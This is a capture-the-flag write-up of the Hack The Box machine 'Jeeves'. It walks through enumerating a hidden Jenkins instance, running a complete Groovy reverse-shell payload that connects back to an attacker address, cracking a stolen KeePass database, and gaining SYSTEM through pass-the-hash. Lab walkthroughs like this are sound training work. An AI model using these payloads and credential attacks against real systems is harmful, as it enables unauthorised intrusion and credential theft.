---
title: 'HTB Jeeves - Medium'
date: 2024-05-09 20:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Windows, HTB]
---

**Jeeves** is a medium HTB machine that begins with a crucial enumeration phase to discover that **Jenkins is running on a high port**. Subsequently, RCE can be achieved by executing a **malicious Groovy script** on the Script Console offered by Jenkins. Finally, there is a **KeePass database** that needs to be cracked to perform a **PtH attack to impersonate the local administrator** user. To read the root flag, one must solve a mini-challenge related to **NTFS alternate data streams**.

<img src="/assets/img/jeeves/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.228.112

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.228.112 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

80, 135, 445, 50000

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.228.112 -sVC -p80,135,445,50000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 20:07 WEST
Nmap scan report for 10.129.228.112
Host is up (0.061s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m13s, deviation: 0s, median: 5h00m12s
| smb2-time: 
|   date: 2024-05-10T00:07:42
|_  start_date: 2024-05-10T00:05:11

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.31 seconds

[+] Script finished successfully
```

This web page receives us on port TCP/80.

<img src="/assets/img/jeeves/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

Any searching query returns this ugly error.htlm page. 

<img src="/assets/img/jeeves/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

This other web page is hosted on port TCP/50000.

<img src="/assets/img/jeeves/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Brute-forcing directories with a big wordlist led us to discover an ‘askjeeves’ endpoint.

```bash
ffuf -u "http://10.129.228.112:50000/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403
askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 61ms]
```

Accessing this endpoint shows a Jenkins open session.

<img src="/assets/img/jeeves/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

If allowed, we could try to execute commands on ‘Manage Jenkins’ > ‘Script Console’.

<img src="/assets/img/jeeves/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

I will be using the following reverse shell payload.

```groovy
// nc -nlvp 8044
String host="10.10.14.112";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

<img src="/assets/img/jeeves/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

And we got a shell as Jeeves! 

```
rlwrap nc -nlvp 8044
listening on [any] 8044 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.228.112] 49676

C:\Users\Administrator\.jenkins>whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins>hostname
Jeeves
```

There is another user called ‘Kohsuke’.

```
C:\Users\Administrator\.jenkins>dir c:\users
	Directory of c:\users
	11/03/2017  11:07 PM    <DIR>          Administrator
	11/05/2017  10:17 PM    <DIR>          DefaultAppPool
	11/03/2017  11:19 PM    <DIR>          kohsuke
	10/25/2017  04:46 PM    <DIR>          Public
```

Apparently, we were granted access to enumerate the contents of Kohsuke’s home directory and read the user flag.

```
C:\Users\Administrator\.jenkins>dir c:\users\kohsuke\desktop
	Directory of c:\users\kohsuke\desktop
	11/03/2017  11:22 PM                32 user.txt

C:\Users\Administrator\.jenkins>type c:\users\kohsuke\desktop\user.txt
e3232272596fb479****************
```

# PrivEsc

There is a KeePass database in Kohsuke's documents folder.

```
C:\Users\Administrator\.jenkins>dir c:\users\kohsuke\documents
	Directory of c:\users\kohsuke\documents
	09/18/2017  01:43 PM             2,846 CEH.kdbx
```

Started an SMB server `impacket-smbserver -smb2support share $(pwd)` and copied the database to our local VM.

```
C:\Users\Administrator\.jenkins>copy c:\users\kohsuke\documents\CEH.kdbx \\10.10.14.112\share\CEH.kdbx
copy c:\users\kohsuke\documents\CEH.kdbx \\10.10.14.112\share\CEH.kdbx
        1 file(s) copied.
```

Converted the file into a valid hash with keepass2john and cracked the hash.

```bash
keepass2john CEH.kdbx > kdbx.hash

john kdbx.hash -w=/usr/share/wordlists/rockyou.txt
CEH:<REDACTED>
```

Opened the database file `keepass2 CEH.kdbx` and inserted the password.

<img src="/assets/img/jeeves/Untitled 7.png" alt="Untitled 7.png" style="width:800px;">

And there it was, our early birthday gift XD.

<img src="/assets/img/jeeves/Untitled 8.png" alt="Untitled 8.png" style="width:800px;">

<img src="/assets/img/jeeves/Untitled 9.png" alt="Untitled 9.png" style="width:800px;">

SMB is the only open port we can use to authenticate. Unfortunately, the users and passwords collected from the database doesn’t return any matches :(.

```bash
netexec smb 10.129.228.112 -u users.list -p pwd.list --continue-on-success | grep -v '[-]'
💩💩💩💩💩
```

The ‘Backup stuff’ entry contained an NTLM hash that I overlooked.

<img src="/assets/img/jeeves/Untitled 10.png" alt="Untitled 10.png" style="width:800px;">

**Performing a Pass the Hash (PtH)** attack against all gathered users reveals that it belongs to the local administrator user.

```bash
netexec smb 10.129.228.112 -u users.list -H '<REDACTED>' --continue-on-success | grep -v '[-]'
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\administrator:<REDACTED> (Pwn3d!)
```

It is possible to connect over SMB as SYSTEM with the administrator hash.

```
impacket-psexec administrator@10.129.228.112 -hashes :<REDACTED>

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
Jeeves
```

And read the… wait, where is the root flag? XD.

```
C:\Windows\system32> type c:\users\administrator\desktop\root.txt
The system cannot find the file specified.
```

After a bit of research, it resulted to be an alternate data stream. This was a fun challenge the first time I did the machine. Now we won’t fall anymore.

```
C:\Windows\system32> dir /r c:\users\administrator\desktop\
	Directory of c:\users\administrator\desktop
	12/24/2017  03:51 AM                36 hm.txt
	                                    34 hm.txt:root.txt:$DATA
```

Read the root flag to officially pwn the box. GGs! 

```
C:\Windows\system32> more < c:\users\administrator\desktop\hm.txt:root.txt
afbc5bd4b615a606****************
```